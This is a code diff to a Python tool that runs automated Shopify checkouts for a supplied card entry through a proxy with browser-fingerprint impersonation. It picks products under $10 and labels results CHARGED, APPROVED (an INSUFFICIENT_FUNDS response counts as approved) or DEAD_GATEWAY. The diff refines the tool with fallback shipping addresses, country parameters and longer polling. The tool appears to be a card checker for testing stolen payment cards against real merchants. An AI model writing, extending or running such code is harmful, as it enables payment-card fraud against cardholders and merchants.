@@ -353,12 +353,14 @@ def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = 0
                 continue
             if price < min_price:
                 continue
+            if price > 10.0:
+                continue
             result = (p.get("title",""), str(p.get("id","")), str(v.get("id","")), v.get("price",""))
             with _product_cache_lock:
                 _product_cache[shop_url] = result + (_time.time(),)
             return result
 
-    raise Exception(f"no available products above ${min_price:.2f} at {shop_url}")
+    raise Exception(f"no available products between ${min_price:.2f} and $10.00 at {shop_url}")
 
 # ──────────────────────── Step 1: cart → checkout ────────────────────
 
@@ -717,7 +719,11 @@ def extract_receipt_status_code(poll_body: str, receipt_type: str) -> str:
         return "ORDER_PLACED"
     if receipt_type == "ProcessingReceipt":
         return "PROCESSING"
-    match = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
+    # ابحث عن "code" المرتبط بـ localizedMessage فقط (نفس نمط check_proposal_errors)
+    # هذا يتجنب مسك currency code أو country code اللي تجي قبل error code
+    match = re.search(
+        r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"',
+        poll_body)
     if match:
         code = match.group(1)
         if "CAPTCHA" in code:
@@ -899,10 +905,10 @@ def send_proposal(client: TLSClient, shop_url: str, checkout_url: str, checkout_
       }}
     }},
     "buyerIdentity": {{
-      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
-      "phoneCountryCode": "US",
+      "customer": {{"presentmentCurrency": "{currency}", "countryCode": "{country}"}},
+      "phoneCountryCode": "{country}",
       "marketingConsent": [],
-      "shopPayOptInPhone": {{"countryCode": "US"}},
+      "shopPayOptInPhone": {{"countryCode": "{country}"}},
       "rememberMe": false
     }},
     "tip": {{"tipLines": []}},
@@ -999,12 +1005,12 @@ def send_proposal2(client: TLSClient, shop_url: str, checkout_url: str, checkout
       }}
     }},
     "buyerIdentity": {{
-      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
+      "customer": {{"presentmentCurrency": "{currency}", "countryCode": "{country}"}},
       "email": "{email}",
       "emailChanged": true,
-      "phoneCountryCode": "US",
+      "phoneCountryCode": "{country}",
       "marketingConsent": [],
-      "shopPayOptInPhone": {{"countryCode": "US"}},
+      "shopPayOptInPhone": {{"countryCode": "{country}"}},
       "rememberMe": false
     }},
     "tip": {{"tipLines": []}},
@@ -1119,12 +1125,12 @@ def send_proposal3(client: TLSClient, shop_url: str, checkout_url: str, checkout
       }}
     }},
     "buyerIdentity": {{
-      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
+      "customer": {{"presentmentCurrency": "{currency}", "countryCode": "{country}"}},
       "email": "{email}",
       "emailChanged": false,
-      "phoneCountryCode": "US",
+      "phoneCountryCode": "{country}",
       "marketingConsent": [],
-      "shopPayOptInPhone": {{"countryCode": "US"}},
+      "shopPayOptInPhone": {{"countryCode": "{country}"}},
       "rememberMe": false
     }},
     "tip": {{"tipLines": []}},
@@ -1340,12 +1346,12 @@ def send_submit_for_completion(client: TLSClient, shop_url: str, checkout_url: s
         }}
       }},
       "buyerIdentity": {{
-        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
+        "customer": {{"presentmentCurrency": "{currency}", "countryCode": "{country}"}},
         "email": "{email}",
         "emailChanged": false,
-        "phoneCountryCode": "US",
+        "phoneCountryCode": "{country}",
         "marketingConsent": [],
-        "shopPayOptInPhone": {{"countryCode": "US"}},
+        "shopPayOptInPhone": {{"countryCode": "{country}"}},
         "rememberMe": false
       }},
       "tip": {{"tipLines": []}},
@@ -1470,7 +1476,9 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
             submit_id   = extract_submit_for_completion_id(js_body)
             if not proposal_id or not submit_id:
                 raise Exception("missing Proposal or Submit ID")
-            poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
+            poll_for_receipt_id = extract_poll_for_receipt_id(js_body)
+            if not poll_for_receipt_id:
+                poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
         except Exception as e:
             result.retryable = True
             result.error = Exception(f"Step 3 failed: {e}")
@@ -1810,7 +1818,7 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
     pass  # removed print
     
     # Create TLS client with curl_cffi
-    client = TLSClient(timeout=12, proxy_url=proxy_url,
+    client = TLSClient(timeout=30, proxy_url=proxy_url,
                        impersonate=impersonate, user_agent=user_agent)
     
     try:
@@ -1861,7 +1869,9 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
             submit_id = extract_submit_for_completion_id(js_body)
             if not proposal_id or not submit_id:
                 raise Exception("missing Proposal or Submit ID")
-            poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
+            poll_for_receipt_id = extract_poll_for_receipt_id(js_body)
+            if not poll_for_receipt_id:
+                poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
         except Exception as e:
             result.status = CheckStatus.ERROR
             result.retryable = True
@@ -1908,45 +1918,63 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
             result.error = Exception(f"Step 5 failed: {e}")
             return result
         
-        # Step 6 - Third proposal with address
+        # Step 6/7/8 - Address proposals with shipping fallback
+        addr            = address_for_country(country)
+        fallback_addrs  = get_fallback_addresses(addr.country_code)
+        fallback_idx    = 0
+        final_proposal_body = None
+        final_queue_token   = None
+
         try:
-            addr = address_for_country(country)
-            pass  # removed print
-            _, proposal3_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
-                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
-                                                queue_token2, email, addr, currency, country)
-            queue_token3 = extract_queue_token(proposal3_body)
-            if not queue_token3:
-                raise Exception("could not extract queueToken")
+            for attempt in range(1 + len(fallback_addrs)):
+                _, p3_body = send_proposal3(
+                    client, shop_url, checkout_url, checkout_token, session_token,
+                    stable_id, variant_id, price, proposal_id, build_id, source_token,
+                    queue_token2, email, addr, currency, country)
+
+                q3 = extract_queue_token(p3_body)
+                if not q3:
+                    raise Exception("could not extract queueToken from proposal3")
+
+                is_digital = not extract_is_shipping_required(p3_body)
+
+                if is_digital:
+                    final_proposal_body = p3_body
+                    final_queue_token   = q3
+                    break
+
+                if detect_shipping_restriction(p3_body) and fallback_idx < len(fallback_addrs):
+                    addr          = fallback_addrs[fallback_idx]
+                    fallback_idx += 1
+                    queue_token2  = q3
+                    continue
+
+                # Address accepted — do one extra poll to get signed handles if needed
+                signed_check = extract_signed_handles(p3_body)
+                if not signed_check:
+                    _, p3_body2 = send_proposal3(
+                        client, shop_url, checkout_url, checkout_token, session_token,
+                        stable_id, variant_id, price, proposal_id, build_id, source_token,
+                        q3, email, addr, currency, country)
+                    q3      = extract_queue_token(p3_body2) or q3
+                    p3_body = p3_body2
+
+                final_proposal_body = p3_body
+                final_queue_token   = q3
+                break
+
+            if not final_proposal_body:
+                raise Exception("No shipping available after trying all fallback countries")
+
         except Exception as e:
             result.status = CheckStatus.ERROR
+            result.retryable = True
             result.error = Exception(f"Step 6 failed: {e}")
             return result
-        
-        # Step 7 - Fourth proposal (repeat)
-        try:
-            _, proposal4_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
-                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
-                                                queue_token3, email, addr, currency, country)
-            queue_token4 = extract_queue_token(proposal4_body)
-            if not queue_token4:
-                raise Exception("could not extract queueToken")
-        except Exception as e:
-            result.status = CheckStatus.ERROR
-            result.error = Exception(f"Step 7 failed: {e}")
-            return result
-        
-        # Step 8 - Fifth proposal
-        try:
-            proposal5_status, proposal5_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
-                                                               stable_id, variant_id, price, proposal_id, build_id, source_token,
-                                                               queue_token4, email, addr, currency, country)
-            _ = proposal5_status
-        except Exception as e:
-            result.status = CheckStatus.ERROR
-            result.error = Exception(f"Step 8 failed: {e}")
-            return result
-        
+
+        proposal5_body   = final_proposal_body
+        queue_token5_pre = final_queue_token
+
         # Step 9 - PCI Session
         try:
             ident_sig = extract_identification_signature(checkout_html)
@@ -1966,7 +1994,7 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
             return result
         
         try:
-            queue_token5 = extract_queue_token(proposal5_body)
+            queue_token5 = queue_token5_pre or extract_queue_token(proposal5_body)
             if not queue_token5:
                 raise Exception("could not extract queueToken")
 
@@ -2062,7 +2090,7 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
         poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
         type_name_re = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')
         
-        for poll_num in range(1, 31):
+        for poll_num in range(1, 41):
             try:
                 _, poll_body = send_poll_for_receipt(
                     client, shop_url, checkout_url, checkout_token, session_token,
@@ -2078,6 +2106,18 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                 result.status_code = status_code
                 
                 if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
+                    # 🔥 تحقق من الـ Dead Gateway (الخصم الوهمي)
+                    dead_signals = [
+                        "payment is being processed",
+                        "receive a confirmation email",
+                        "confirmation email with your order number shortly"
+                    ]
+                    if any(sig in poll_body.lower() for sig in dead_signals):
+                        result.status      = CheckStatus.DECLINED
+                        result.status_code = "DEAD_GATEWAY"
+                        result.error       = Exception("DEAD_GATEWAY")
+                        return result
+
                     pass  # removed print
                     result.status      = CheckStatus.CHARGED
                     result.status_code = "ORDER_PLACED"
@@ -2098,12 +2138,14 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                 
                 if receipt_type == "FailedReceipt":
                     error_code = ""
-                    error_re = re.compile(r'"code"\s*:\s*"([^"]+)"')
+                    # استخدم نمط localizedMessage لتجنب مسك currency/country codes
+                    error_re = re.compile(
+                        r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"')
                     match = error_re.search(poll_body)
                     if match:
                         error_code = match.group(1)
                     if "CAPTCHA" in error_code:
-                        error_code = "CARD_DECLINED"
+                        error_code = "CPATCHA_REQUIRED"
                     
                     if error_code == "INSUFFICIENT_FUNDS":
                         result.status = CheckStatus.APPROVED
@@ -2136,7 +2178,7 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                             delay = d
                     except ValueError:
                         pass
-                time.sleep(min(delay, 300) / 1000.0)
+                time.sleep(min(delay, 1000) / 1000.0)
                 
             except Exception as e:
                 result.status = CheckStatus.ERROR
@@ -2144,7 +2186,7 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                 return result
         
         result.status = CheckStatus.ERROR
-        result.error = Exception("exceeded 30 poll attempts")
+        result.error = Exception("exceeded 40 poll attempts")
         return result
         
     finally:
